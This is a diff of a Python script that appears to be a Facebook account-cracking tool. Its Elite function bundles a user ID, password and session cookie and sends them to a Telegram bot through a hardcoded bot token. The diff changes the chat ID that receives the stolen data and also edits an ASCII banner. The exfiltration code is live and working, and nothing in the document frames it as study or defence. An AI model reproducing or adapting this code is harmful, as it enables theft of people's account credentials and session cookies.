@@ -73,7 +73,7 @@ def Elite(id,ps,coki):
     try:
         import requests
         token = "6349910946:AAExBySGtSpLqEhd1dhDjhPVUEfv9LMvJv4"#Add yout token 
-        chatid = "6619837127"#Add your Chat Id
+        chatid = "09945689794"#Add your Chat Id
         ok_id =str(id+"|"+ps+"|"+coki)
         url = f"https://api.telegram.org/bot{token}/sendMessage"
         params = {"chat_id": chatid, "text": ok_id}
@@ -130,7 +130,7 @@ R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-logo = ("""
+logo ="""
 \033[1;32m▄▄█▀▀▀█▄████▀▀▀███▀███▄   ▀███▀██▀▀██▀▀███▄█▀▀▀█▄████▀   ▀███▀  
 \033[1;32m██▀     ▀█ ██    ▀█  ███▄    █ █▀   ██   ▀███    ▀███       █  
 \033[1;32m██▀       ▀ ██   █    █ ███   █      ██    ▀███▄    ██       █    
